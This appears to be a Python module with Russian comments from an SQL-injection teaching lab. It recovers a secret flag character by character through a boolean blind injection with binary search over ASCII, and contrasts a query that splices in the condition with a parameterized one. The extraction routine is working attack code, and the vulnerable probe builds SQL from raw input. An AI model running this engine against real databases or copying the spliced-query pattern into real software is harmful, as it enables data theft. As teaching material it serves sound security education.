"""Движок blind-экспериментов.

Логика перебора символов одинакова для обоих режимов — различается только
то, **как** условие попадает в SQL:

* ``probe_vulnerable`` — условие вклеивается в текст запроса (инъекция);
* ``probe_secure``     — условие передаётся параметром и ищется буквально.

Именно эта разница даёт результат: в первом случае перебор возвращает
настоящий флаг, во втором — пустоту.

Символы ищутся **бинарным поиском по диапазону ASCII**: за один символ
уходит 7–8 запросов вместо перебора всех ~90 возможных значений. Это и
быстрее, и точнее показывает суть blind-инференса — из ответа «больше или
меньше» собирается полное значение.
"""

import string

# Диапазон перебора: печатаемые ASCII-символы.
MIN_CHAR = 32
MAX_CHAR = 126

# Символ, которым заканчиваются искомые значения в этой лаборатории.
TERMINATOR = "}"


def _esc(text):
    """Экранировать одинарную кавычку для SQL-литерала."""
    return text.replace("'", "''")


def _sql_char(value):
    """Собрать SQL-литерал из одного символа."""
    return "'" + _esc(value) + "'"


def probe_vulnerable(conn, condition):
    """Выполнить условие как часть SQL (инъекционный режим).

    Возвращает True, если условие истинно, False — если ложно, None — если
    запрос завершился ошибкой.
    """
    sql = f"SELECT 1 FROM users WHERE ({condition}) LIMIT 1"
    try:
        cur = conn.cursor()
        cur.execute(sql)
        return cur.fetchone() is not None
    except Exception:
        return None


def probe_secure(conn, condition):
    """Передать условие параметром, а не кодом (защищённый режим).

    Значение сравнивается как обычная строка: к SQL-коду оно не имеет
    никакого отношения и повлиять на логику запроса не может.
    """
    sql = "SELECT 1 FROM users WHERE username = ? AND password = ? LIMIT 1"
    try:
        cur = conn.cursor()
        cur.execute(sql, (condition, condition))
        return cur.fetchone() is not None
    except Exception:
        return None


def build_char_condition(position, row=1, table="secrets", column="content"):
    """Условие «совпадает ли N-й символ секрета с заданным».

    Возвращает шаблон с плейсхолдером ``{char}``.
    """
    return (
        f"SUBSTR((SELECT {column} FROM {table} ORDER BY id LIMIT 1 OFFSET {row - 1}),"
        f"{position},1)='{{char}}'"
    )


def build_ge_condition(position, row=1, table="secrets", column="content"):
    """Условие «N-й символ секрета не меньше заданного» (для бинарного поиска)."""
    return (
        f"SUBSTR((SELECT {column} FROM {table} ORDER BY id LIMIT 1 OFFSET {row - 1}),"
        f"{position},1)>={{char}}"
    )


def find_char_at(probe, position, row=1, table="secrets", column="content", budget=None):
    """Найти символ на указанной позиции бинарным поиском.

    ``probe`` — функция ``condition -> True/False/None``.
    Возвращает кортеж ``(символ или None, число использованных запросов)``.

    Если условие ни разу не сработало или бюджет исчерпан, символ не
    найден — это ожидаемый результат в защищённом режиме.
    """
    used = 0
    lo, hi = MIN_CHAR, MAX_CHAR
    while lo <= hi:
        if budget is not None and used >= budget:
            return None, used
        mid = (lo + hi) // 2
        condition = build_ge_condition(position, row, table, column).format(
            char=_sql_char(chr(mid))
        )
        result = probe(condition)
        used += 1
        if result is None:
            return None, used
        if result:
            lo = mid + 1
        else:
            hi = mid - 1

    code = lo - 1
    if code < MIN_CHAR or code > MAX_CHAR:
        return None, used
    return chr(code), used


def extract_value(
    probe,
    row=1,
    max_steps=64,
    table="secrets",
    column="content",
    query_budget=4000,
):
    """Посимвольно восстановить значение секрета.

    ``probe`` — функция ``condition -> True/False/None``.
    Возвращает словарь с найденным значением, числом шагов и журналом проб.

    Ограничения обязательны: перебор не должен превращаться в бесконечный
    цикл, даже если условие никогда не становится истинным.
    """
    found = []
    log = []
    steps = 0
    truncated = False
    budget = query_budget

    for position in range(1, max_steps + 1):
        if budget <= 0:
            truncated = True
            break

        char, used = find_char_at(
            probe, position, row, table, column, budget=budget
        )
        steps += used
        budget -= used

        if char is None:
            truncated = True
            break

        found.append(char)
        log.append(
            {
                "position": position,
                "char": char,
                "condition": build_char_condition(
                    position, row, table, column
                ).format(char=_esc(char)),
                "prefix": "".join(found),
            }
        )

        if char == TERMINATOR:
            break

    return {
        "value": "".join(found),
        "steps": steps,
        "max_steps": max_steps,
        "truncated": truncated,
        "log": log,
    }
